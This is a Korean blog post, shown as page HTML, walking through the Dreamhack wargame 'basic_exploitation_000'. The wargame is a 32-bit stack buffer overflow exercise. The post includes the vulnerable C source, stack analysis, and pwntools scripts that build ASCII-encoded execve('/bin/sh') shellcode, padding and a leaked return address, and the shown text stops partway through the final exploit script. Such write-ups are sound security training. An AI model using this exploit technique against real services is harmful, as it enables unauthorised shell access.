<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Wargame: Basic_Exploitation_000 - TouBVa </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="BOF-Return Address Overwrite- Wargame: Basic_Exploitation_000"> <meta name="keywords" content="Wargame: Basic_Exploitation_000, TouBVa, dreamhack_system_hacking,System Hacking, BOF, Return Address Overwrite"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="TouBVa" property="og:site_name" /> <meta content="Wargame: Basic_Exploitation_000" property="og:title" /> <meta content="article" property="og:type" /> <meta content="BOF-Return Address Overwrite" property="og:description" /> <meta content="http://localhost:4000/blog/dreamhack_system_hacking/step5-basic_exploitation_000" property="og:url" /> <meta content="2022-12-28T18:11:23+09:00" property="article:published_time" /> <meta content="http://localhost:4000/about/" property="article:author" /> <meta content="http://localhost:4000/assets/img/posts/basic_exploitation_000/Untitled%201.jpeg" property="og:image" /> <meta content="dreamhack_system_hacking" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Wargame: Basic_Exploitation_000" /> <meta name="twitter:url" content="http://localhost:4000/blog/dreamhack_system_hacking/step5-basic_exploitation_000" /> <meta name="twitter:description" content="BOF-Return Address Overwrite" /> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css" /> <!-- <link rel="stylesheet" href="http://localhost:4000/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="http://localhost:4000/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = 'http://localhost:4000' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="http://localhost:4000/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="http://localhost:4000/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="http://localhost:4000/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="http://localhost:4000/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="http://localhost:4000/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="http://localhost:4000/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="http://localhost:4000/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="http://localhost:4000/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="http://localhost:4000/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="http://localhost:4000/assets/js/search.js"></script> <script src="http://localhost:4000/assets/js/on-scroll-progress.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">TouBVa</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/about" >About</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/contact" >Contact</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/styleguide"> Styleguide </a> </li> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item" style="margin-top:5px; padding-right:20px;" > <a class="header__checkout snipcart-checkout"> <svg width="31" height="27" viewBox="0 0 31 27" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M1.10512 0.368718C0.560256 0.368718 0.118164 0.812066 0.118164 1.35848C0.118164 1.9049 0.560256 2.34824 1.10512 2.34824H4.90887L8.30138 18.4009C8.43503 19.0053 8.83085 19.5079 9.32946 19.5041H25.7788C26.3005 19.5118 26.7799 19.0375 26.7799 18.5143C26.7799 17.9911 26.3006 17.5168 25.7788 17.5245H10.1315L9.71003 15.545H27.095C27.5371 15.5412 27.9547 15.2048 28.0511 14.7718L30.354 4.87412C30.4825 4.29933 29.9852 3.67172 29.3979 3.66786H7.21171L6.6771 1.15221C6.58329 0.71276 6.15921 0.368652 5.7107 0.368652L1.10512 0.368718ZM7.623 5.64746H12.7634L13.2569 8.61674H8.25005L7.623 5.64746ZM14.7785 5.64746H20.9881L20.4946 8.61674H15.2719L14.7785 5.64746ZM23.0031 5.64746H28.1537L27.4649 8.61674H22.5097L23.0031 5.64746ZM8.67181 10.5963H13.5862L14.0797 13.5656H9.29919L8.67181 10.5963ZM15.6009 10.5963H20.1656L19.6721 13.5656H16.0944L15.6009 10.5963ZM22.1807 10.5963H27.0023L26.3135 13.5656H21.6872L22.1807 10.5963ZM12.6197 20.164C10.8141 20.164 9.32979 21.6525 9.32979 23.4632C9.32979 25.2739 10.8141 26.7624 12.6197 26.7624C14.4252 26.7624 15.9095 25.2739 15.9095 23.4632C15.9095 21.6525 14.4252 20.164 12.6197 20.164ZM22.4892 20.164C20.6837 20.164 19.1994 21.6525 19.1994 23.4632C19.1994 25.2739 20.6837 26.7624 22.4892 26.7624C24.2948 26.7624 25.7791 25.2739 25.7791 23.4632C25.7791 21.6525 24.2948 20.164 22.4892 20.164ZM12.6197 22.1435C13.3586 22.1435 13.9356 22.7222 13.9356 23.4632C13.9356 24.2042 13.3586 24.7829 12.6197 24.7829C11.8807 24.7829 11.3037 24.2042 11.3037 23.4632C11.3037 22.7222 11.8807 22.1435 12.6197 22.1435ZM22.4892 22.1435C23.2282 22.1435 23.8052 22.7222 23.8052 23.4632C23.8052 24.2042 23.2282 24.7829 22.4892 24.7829C21.7503 24.7829 21.1733 24.2042 21.1733 23.4632C21.1733 22.7222 21.7503 22.1435 22.4892 22.1435Z" fill="#ff7901" class="header__checkout-fill"></path> </svg> <span class="snipcart-items-count"></span> <!-- <span class="snipcart-total-price"></span> --> </a> </li> <!-- <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher()" type="checkbox" name="checkbox" /> </li> --> </ul> </nav> <div id="progress-bar"></div> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div><div class="main-container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Wargame: Basic_Exploitation_000</h1> <h4 class="post-meta">BOF-Return Address Overwrite</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="http://localhost:4000/blog/authors/TouBVa">TouBVa</a></span> </span > at <time datetime="2022-12-28 18:11:23 +0900" itemprop="datePublished" >Dec 28, 2022</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/dreamhack_system_hacking/step5-basic_exploitation_000" ></span> <div class="post-categories"> Category : <a href="/blog/categories/dreamhack_system_hacking" >dreamhack_system_hacking</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top" src="http://localhost:4000/assets/img/posts/basic_exploitation_000/Untitled%201.jpeg" alt="" /> <br /> <br /> <p>드림핵의 시스템 해킹 기본 문제 중 하나인 basic_exploitation_000을 풀어 보았다.</p> <p>종강하고 나서 저번 방학 때 수강하던 트랙을 이어서 수강하고 있는 중이라… 사실 이 문제가 무엇을 취약점으로 가지고 있는지 까먹은 상태로 풀었다. 그래서 익스플로잇을 결정할 때 ROP를 이용한 RTL을 할 건지(입력 가능한 비트수 때문에 탈락) Return Address Overwrite를 할 건지 잠깐 고민했는데, 지금 보니 문제에 Retrun Address Overwrite를 쓰라고 버젓이 나와 있었네… 뭔가를 할 땐 설명서부터 잘 읽는 삶을 살도록 하자. 머쓱해질 수 있으니까,,</p> <p>그럼 기존의 절차를 이용해 익스플로잇을 진행해 보도록 하자. <br /> <br /></p> <h1 id="1-주어진-정보-분석-취약점-지정">1. 주어진 정보 분석, 취약점 지정</h1> <p><br /></p> <p>먼저 서버에서 돌아가고 있는 취약한 프로그램의 바이너리와 소스 코드가 주어졌기 때문에 해당 문제의 난이도가 훅 낮아졌다. (소스 코드를 준 걸 까먹고 바이너리만 본 사람 여깄다… 뭔가를 할 땐 구성품을 잘 확인하는 이하생략)</p> <p>소스 코드를 한 번 확인해보자.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">alarm_handler</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"TIME OUT"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">initialize</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">alarm_handler</span><span class="p">);</span>
    <span class="n">alarm</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>

    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x80</span><span class="p">];</span>

    <span class="n">initialize</span><span class="p">();</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"buf = (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%141s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>사용자에게 입력값을 받아서 버퍼에 저장하는 구조의 코드이다. ‘검증되지 않은 사용자에게서 입력값을 받는 부분’에 boundary check가 되어 있어 언뜻 보기에는 아무 문제 없어 보인다.</p> <p>그러나 해당 코드에는 Buffer Overflow 취약점이 존재한다. 선언된 입력값 저장 변수인 buf의 크기는 0x80, 즉 128 byte 인데 boundary check로 제한된 입력값의 최대 길이는 141 byte이기 때문이다. 따라서 총 13byte가 overflow 될 수 있다.</p> <p>13byte 라니 고작 저 정도 수로 어떻게 뭐가 가능한 건가 싶다. 그러나 main 함수에 로컬 변수가 buf 하나밖에 선언되지 않았고, 32비트로 컴파일된 프로그램이기 때문에 13byte로 충분히 ebp와 ret address까지 덮어쓸 수 있다.</p> <p><br /></p> <p>그러나 이제까지 배운 대로라면 고작 그 정도 아닐까? ebp와 ret address의 길이를 합하면 8 byte이다. 스택에 함수의 인자를 저장하는 cdecl calling convention의 특성상 ret address를 execve라고 잡으면 그 바로 밑에 execve 스택 프레임의 ret address로 4 byte, 그 밑에 “/bin/sh” 문자열의 주소로 4byte, 총합 8 byte가 최소한으로 더 필요하다.</p> <p>즉, 스택 프레임을 전부 덤프로 채우고 ret address 부터 진짜로 의미 있는 값을 넣어 왔던 지난 BOF 방식은 먹히지 않는다.</p> <p>현재의 방법이 불가능하다면 새로운 방법을 모색하면 된다. 1) 새로운 가설을 세우고, 2) 그것이 가능한지 확인한 후 3) 가능하다면 실행하면 되는 것이다.</p> <p><br /></p> <p><img src="/assets/img/posts/basic_exploitation_000/Untitled.jpeg" alt="Untitled" /></p> <p>먼저 기존의 방법이다. 기존의 방법이 자주 사용되는 이유는, esp의 위치를 고려하기 편하기 때문이었다. 직전 함수의 epilogue로 인해 자동으로 esp가 ebp가 가리키던 위치를 가리키게 된다는 점이 핵심이다.</p> <p>다만 이번 경우에는 위와 같은 방법이 불가능하다.</p> <p>그렇다면, 어쨌든 ret address에 들어 있는 메모리의 주소로 eip가 옮겨가므로, 차라리 eip에 buf의 시작 주소를 주고 buf 안에 쉘코드를 채우면 ‘ebp 아래 공간의 부족’ 이라는 한계를 해결할 수 있지 않을까?</p> <p><br /></p> <p><img src="/assets/img/posts/basic_exploitation_000/Untitled%201.jpeg" alt="Untitled" /></p> <p>바로 위의 그림처럼 말이다. 그러나 해당 방법이 성공하려면 stack에 execute 권한이 있어야 한다. 즉, NX-bit가 걸려있지 않아야 한다. gdb를 이용해 스택의 권한을 확인해 보자.</p> <p><img src="/assets/img/posts/basic_exploitation_000/Untitled%202.jpeg" alt="Untitled" /></p> <p>가장 아래의 [stack]에는 read, write, execution 권한이 있고, private(copy on write)로 설정되어 있다. p가 올 자리에 s가 왔다면 그건 프로세스가 해당 영역을 변경하는 것이 비밀이 아니라는(shared) 뜻이다.</p> <p>private(copy on write)로 설정된 메모리 영역에 대한 설명은 아래를 참고하자!</p> <blockquote> <p>**<Private Mapping="">**</Private></p> <p><strong>Private mapping (MAP_PRIVATE):</strong> Modifications to the contents of the mapping are not visible to other processes.</p> <p>For file mapping they are not carried through to the underlying file. Changes to the contents of the mapping are nevertheless private to each process.</p> <p>The kernel accomplishes this by using the <strong>copy-on-write</strong> technique. This means that whenever a process attempts to modify the contents of a page, the kernel first creates a new, separate copy of that page for the process (and adjusts the process’s page tables).</p> <p>For this reason, a MAP_PRIVATE mapping is sometimes referred to as a private, copy-on-write mapping. (Source: The Linux Programming Interface book)</p> </blockquote> <p><br /></p> <p>정리하자면, 현재 프로세스의 스택에는 실행 권한이 있기 때문에 스택에 들어 있는 인스트럭션을 rip가 가리킨다면 실행될 수 있다. 즉, 앞서 말했던 방법이 ROP 등의 NX-bit bypass 없이도 성공할 수 있다. <br /> <br /></p> <h1 id="2-취약점-익스플로잇-설계">2. 취약점 익스플로잇 설계</h1> <p><br /></p> <p>앞서 지정한 취약점을 익스플로잇하기 위한 페이로드의 구조는 아래와 같을 것이다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode(execve("/bin/sh", 0, 0)) + dump byte + RET address(buf[0])
</code></pre></div></div> <p>이제 익스플로잇 구성에 필요한 각 정보를 알아내 보자.</p> <p><br /></p> <h2 id="2-1-쉘코드-구성">2. 1. 쉘코드 구성</h2> <p><br /></p> <p>사실 직접 쉘코드를 만드는 방법도 있다. 이전의 포스트에서 했던 것처럼 C 언어 코드를 짜고 그것을 오브젝트 코드로 컴파일해도 되고, 어셈블리로 바로 코드를 짜도 된다.</p> <p>그러나 실전에서는 내가 직접 쉘코드를 짠다는 것은 시간과 자원 낭비다. 이미 좋은 자동화 도구들이 있기 때문이고, 특정 바이트들을 피해 쉘코드를 짜야 하는 경우가 생기는데 사실 사람 머리로는 정말 힘든 작업이기 때문이다.</p> <p><br /></p> <p>쉘코드를 만들 수 있는 해킹 툴에는 여러 가지가 있다. 그러니 각자 입맛대로 metasploit을 사용해도 되고, pwntools를 사용해도 된다.</p> <p>metasploit의 경우 cmd 툴로 사용되고, pwntools로는 shellcraft라는 모듈을 cmd 툴로 사용하거나 여타 모듈을 이용해 파이썬 코드로 원하는 쉘코드를 만들어낼 수 있다. 나는 이번 익스플로잇 작성에 pwntools를 사용했다.</p> <p><br /></p> <p>앞서 설명하면서, 쉘코드를 짤 때 특정 바이트들을 피해 쉘코드를 짜야 한다는 말을 했다. 사실 이번 익스플로잇 구성에서 정확히 이런 일이 일어나는 바람에 shellcraft를 사용했다.</p> <p>쉘코드를 입력했을 때 특정 바이트들부터 입력이 뚝 잘려서 안 들어가거나, 혹은 쉘코드는 잘 들어갔는데 eip가 실행 중간에 멈춰버리는 일이 일어날 수 있다.</p> <p>전자의 경우 stdin을 받는 함수의 특성으로 인해 특정 바이트 값을 입력의 끝(예: 0x00 null)으로 인식해서 발생하는 문제이고, 후자의 경우는 bad character(예: 0x90 nop)로 인해 발생하는 문제이다.</p> <p>전자의 해결책은 0x00부터 0xff까지를 전부 메모리에 넣어주면서 문제가 생기는 바이트를 하나씩 제거하고 다시 보내기를 반복하면서 입력에 문제가 생기는 바이트의 리스트를 만드는 것이고, 후자의 해결책은 실행 중 eip가 stuck 되는 바이트를 찾아내서 서서히 제외시키는 것이다.</p> <p><br /></p> <p>bad character는… 내가 알기로는 CPU가 이상한 바이트라고 생각해 코드의 흐름을 멈춰세우도록 만드는 바이트를 의미하고 각 CPU나 메모리 상태에 따라 그 종류가 달라지기 때문에 사실상 랜덤이라고는 하는데, 지금 약간 의심이 생긴다.</p> <p><del>stdin을 받는 함수 특성으로 인해 발생하는 문제에다가 bad character라는 이름을 붙인 거 아냐?</del></p> <p><br /></p> <p>익스플로잇 대상의 소스를 확인해 보면 사용자의 입력값을 <code class="language-plaintext highlighter-rouge">scanf</code> 함수를 이용해 받는다. 그런데 이 <code class="language-plaintext highlighter-rouge">scanf</code> 는 특정 바이트는 무시하는 특징이 있다. 즉, Null byte(<code class="language-plaintext highlighter-rouge">\x00</code>) 만을 입력값의 종료로 인식하는 게 아니라는 거다.</p> <p>잘 생각해 보면 맞다. <code class="language-plaintext highlighter-rouge">scanf</code> 함수를 이용해 사용자 입력값을 받을 때 공백(space, <code class="language-plaintext highlighter-rouge">\x20</code>)을 중간에 넣는다면 문자열은 정확히 공백 앞까지만 입력된다.</p> <p>이처럼, <code class="language-plaintext highlighter-rouge">scanf</code> 가 거부하는 특수한 바이트가 있다. 그 목록은 아래와 같다.</p> <p><strong>\x09</strong> : ctrl+I; HT로, 탭 문자</p> <p><strong>\x0a</strong>: ctrl+J; LF로, 유닉스에서 사용되는 개행 문자</p> <p><strong>\x0b</strong>: ctrl+K; VT로, Vertical Tab</p> <p><strong>\x0c</strong>: ctrl+L; FF로, Form Feed(다음 페이지)</p> <p><strong>\x0d</strong>: CR; Carriage Return(캐리지 리턴 (\r))</p> <p><strong>\x20</strong>: Space(공백)</p> <p>해당 바이트들을 제외하고 execve(”/bin/sh”, 0, 0) 쉘코드를 만들기 위해 아래와 같이 코드를 작성했다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">'linux'</span><span class="p">)</span>
<span class="n">avoid</span> <span class="o">=</span> <span class="p">{</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x09</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0a</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0b</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0c</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0d</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x20</span><span class="s">'</span><span class="p">}</span>

<span class="n">tmp_shellcode</span><span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="n">shellcode</span><span class="o">=</span> <span class="n">encoders</span><span class="p">.</span><span class="n">i386</span><span class="p">.</span><span class="n">ascii_shellcode</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">tmp_shellcode</span><span class="p">,</span> <span class="n">avoid</span><span class="p">)</span>
</code></pre></div></div> <p><br /></p> <h2 id="2-2-dump-byte-수-계산">2. 2. dump byte 수 계산</h2> <p><br /></p> <p>gdb를 이용해 buf 변수에 몇 바이트가 할당되었는지 확인해 보자.</p> <p><img src="/assets/img/posts/basic_exploitation_000/Untitled%203.jpeg" alt="Untitled" /></p> <p>이 부분을 봐도 되고,</p> <p><img src="/assets/img/posts/basic_exploitation_000/Untitled%204.jpeg" alt="Untitled" /></p> <p>이 부분을 봐도 된다. 첫 번째 사진의 경우 <code class="language-plaintext highlighter-rouge">esp</code>에 <code class="language-plaintext highlighter-rouge">-0x80</code>을 더하고 있고(저 시점에서는 <code class="language-plaintext highlighter-rouge">ebp</code>==<code class="language-plaintext highlighter-rouge">esp</code>이다) 두번째 사진에서는 scanf의 두번째 인자(입력값이 저장될 주소)로 <code class="language-plaintext highlighter-rouge">ebp-0x80</code>을 하고 있다.</p> <p>즉, buf[0]에서부터 ret add까지의 바이트 수는 <code class="language-plaintext highlighter-rouge">0x84 byte</code>이다.</p> <p>따라서 dump byte의 바이트 수는 <code class="language-plaintext highlighter-rouge">0x84-shellcode byte</code> 가 된다.</p> <p>이 점을 반영하기 위해 아래와 같이 코딩했다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">'linux'</span><span class="p">)</span>
<span class="n">avoid</span> <span class="o">=</span> <span class="p">{</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x09</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0a</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0b</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0c</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x0d</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\x20</span><span class="s">'</span><span class="p">}</span>

<span class="n">tmp_shellcode</span><span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="n">shellcode</span><span class="o">=</span> <span class="n">encoders</span><span class="p">.</span><span class="n">i386</span><span class="p">.</span><span class="n">ascii_shellcode</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">tmp_shellcode</span><span class="p">,</span> <span class="n">avoid</span><span class="p">)</span>
<span class="n">shellcode_len</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x84</span><span class="o">-</span><span class="n">shellcode_len</span><span class="p">)</span>
</code></pre></div></div> <p><br /></p> <h2 id="2-3-ret-address-알아내기">2. 3. ret address 알아내기</h2> <p><br /></p> <p>주어진 소스를 다시 보면, buf의 시작 주소를 출력해 준다는 것을 알 수 있다. 따라서 프로그램의 출력값을 읽어오는 pwntools의 recv 함수가 필요하다.</p> <p>아래와 같이 코딩했다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># receiving data and sending data
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'{target_url}'</span><span class="p">,</span> <span class="p">{</span><span class="n">port_num</span><span class="p">})</span>
<span class="c1"># process("./basic_exploitation_000")
</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">dump</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'('</span><span class="p">)</span>
<span class="n">data</span><span class="p">,</span> <span class="n">dump</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">')'</span><span class="p">)</span>

<span class="n">data</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="c1"># constructing payload
</span>
<span class="n">ret_add</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div> <p>출력되는 데이터는 <code class="language-plaintext highlighter-rouge">buf = ({address})</code> 의 형태일 것이기 때문에 데이터를 받아 소괄호를 기준으로 데이터를 분리해 내는 작업을 하도록 만들었다.</p> <p>그런데 사실 더 편리한 방법이 있다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...(</span><span class="n">생략</span><span class="p">)...</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"buf = ("</span><span class="p">)</span>
<span class="n">ret_add</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span> <span class="c1"># 0x00000000 format
</span><span class="p">...(</span><span class="n">후략</span><span class="p">)...</span>
</code></pre></div></div> <p>이렇게 할 걸….</p> <p>문제 다 풀고 나서 생각났다……………………</p> <p><br /> <br /></p> <h1 id="3-익스플로잇-수행">3. 익스플로잇 수행</h1> <p><br /></p> <p>앞서 짠 코드들을 전부 조합하면 아래와 같은 익스플로잇이 나온다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># receiving data and sending data
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'{target_url}'</span><span class="p">,</span> <span class="p">{</span><span class="n">port_num</span><span class="p">})</span>

<span class="n">data</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="n">dump</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'('</span><span class="p">)</span>
